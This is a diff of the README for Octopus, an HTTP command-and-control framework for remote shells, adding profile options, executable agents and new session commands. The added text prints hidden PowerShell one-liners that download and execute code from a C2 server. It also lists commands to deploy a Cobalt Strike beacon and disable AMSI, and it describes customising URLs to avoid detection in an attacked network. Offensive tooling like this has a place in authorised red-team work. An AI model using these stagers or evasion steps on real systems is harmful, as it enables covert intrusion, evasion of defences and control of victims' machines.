@@ -71,21 +71,17 @@ You will by greeted with the following once you run it :
 
 
 
-  /$$$$$$              /$$
- /$$__  $$            | $$
-| $$  \ $$  /$$$$$$$ /$$$$$$    /$$$$$$   /$$$$$$  /$$   /$$  /$$$$$$$
-| $$  | $$ /$$_____/|_  $$_/   /$$__  $$ /$$__  $$| $$  | $$ /$$_____/
-| $$  | $$| $$        | $$    | $$  \ $$| $$  \ $$| $$  | $$|  $$$$$$
-| $$  | $$| $$        | $$ /$$| $$  | $$| $$  | $$| $$  | $$ \____  $$
-|  $$$$$$/|  $$$$$$$  |  $$$$/|  $$$$$$/| $$$$$$$/|  $$$$$$/ /$$$$$$$/
- \______/  \_______/   \___/   \______/ | $$____/  \______/ |_______/
-                                        | $$
-                                        | $$
-                                        |__/
+.88888.   a88888b. d888888P  .88888.   888888ba  dP     dP .d88888b
+d8'   `8b d8'   `88    88    d8'   `8b  88    `8b 88     88 88.    "'
+88     88 88           88    88     88 a88aaaa8P' 88     88 `Y88888b.
+88     88 88           88    88     88  88        88     88       `8b
+Y8.   .8P Y8.   .88    88    Y8.   .8P  88        Y8.   .8P d8'   .8P
+`8888P'   Y88888P'    dP     `8888P'   dP        `Y88888P'  Y88888P
 
 
 
-					    V1.0 BETA !
+
+                    v1.0 stable !
 
 
  Octopus C2 | Control your shells
@@ -104,33 +100,34 @@ You can generate as many listeners as you need, and then you can start interacti
 
 Before you can start using Octopus you have to setup a URL handling profile which will control the C2 behavior and functions, as Octopus is an HTTP based C2 thus it depends on URLs to handle the connections and to guarantee that the URLs will not serve as a signatures or IoC in the network you are currently attacking, the URLs can be easily customized and renamed as needed.
 
-> Profile setup currently only support URL handling, but with the next few updates you will be able to control additional options such as headers,html templates ,etc...
+> Profile setup currently only support URL handling, auto kill value and headers.
 
 **Setting up your profile**
 
 To start setting up your profile you need to edit the `profile.py` file , which contains a number of key variables, which are:
 
-  - file_reciever_url : handles file downloading.
-  - report_url : handle ESA reports.
-  - command_send_url : handles the commands that will be sent to the target.
-  - command_receiver_url : handles commands will be executed on the target.
-  - first_ping_url : handles the first connection from the target.
-  - server_response_header : this header will show in every response.
+  - file_reciever_url: handles file downloading.
+  - report_url: handle ESA reports.
+  - command_send_url: handles the commands that will be sent to the target.
+  - command_receiver_url: handles commands will be executed on the target.
+  - first_ping_url: handles the first connection from the target.
+  - server_response_header: this header will show in every response.
+  - auto_kill: variable to control when the agent will be killed after N failed connections with the C2
 
 
 Example:
 
 ```
-#!/usr/bin/python2.7
+#!/usr/bin/python3
 
 # this is the web listener profile for Octopus C2
-# you can customize your profile to handle a specific URL to communicate with the agent
+# you can customize your profile to handle a specific URLs to communicate with the agent
 # TODO : add the ability to customize the request headers
 
 # handling the file downloading
 # Ex : /anything
 # Ex : /anything.php
-file_reciever_url = "/messages"
+file_receiver_url = "/messages"
 
 
 # handling the report generation
@@ -161,7 +158,12 @@ first_ping_url = "/login"
 server_response_header = "nginx"
 
 # will return white page that includes HTA script
-mshta_url="/hta"
+mshta_url = "/hta"
+
+# auto kill value after n tries
+
+auto_kill = 10
+
 
 ```
 
@@ -281,8 +283,19 @@ To generate an agent for the listener `operation1` we can use the following comm
 and we will get the following result:
 ```
 Octopus >>generate_powershell operation1
+#====================
+1) powershell -w hidden "IEX (New-Object Net.WebClient).DownloadString('http://192.168.178.1:8080/page.php');"
 
-powershell -w hidden "IEX (New-Object Net.WebClient).DownloadString('http://192.168.178.1:8080/page.php');"
+2) powershell -w hidden "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://192.168.178.1:8080/page.php');"
+
+3) powershell -w hidden "$m = (New-Object Net.WebClient).DownloadString('http://192.168.178.1:8080/page.php');Invoke-Expression $m;"
+
+Note - For Windows 7 clients you may need to prefix the payload with "Add-Type -AssemblyName System.Core;"
+       e.g. powershell -w hidden "Add-Type -AssemblyName System.Core;IEX (New-Object Net.WebClient).DownloadString('http://192.168.178.1:8080/page.php');"
+
+Hack your way in ;)
+#====================
+
 ```
 
 Now we can use this oneliner to start our agent.
@@ -309,12 +322,12 @@ Please note that you can edit the `/hta` URL using `profile.py`
 
 To generate an EXE agent for listener `operation1` we can use the following command:
 
-`generate_exe operation1 /opt/Octopus/file.exe`
+`generate_unmanaged_exe operation1 /opt/Octopus/file.exe`
 
 and we will get the following result:
 
 ```
-Octopus >>generate_exe darkside_operation2 /opt/Octopus/file.exe
+Octopus >>generate_unmanaged_exe darkside_operation2 /opt/Octopus/file.exe
 [+] file compiled successfully !
 [+] binary file saved to /opt/Octopus/file.exe
 Octopus >>
@@ -375,10 +388,10 @@ Hint : if you want to execute system command just type it and wait for the resul
 help  				show this help menu
 exit/back 			exit current session and back to the main screen
 clear 				clear the screen output
-upload 				upload file to the target machine
 download 			download file from the target machine
+deploy_cobalt_beacon 		deploy cobalt strike powershell beacon in the current process
 load 				load powershell module to the target machine
-disable_amsi 		disable AMSI on the target machine
+disable_amsi 			disable AMSI on the target machine
 report 				get situation report from the target
 
 
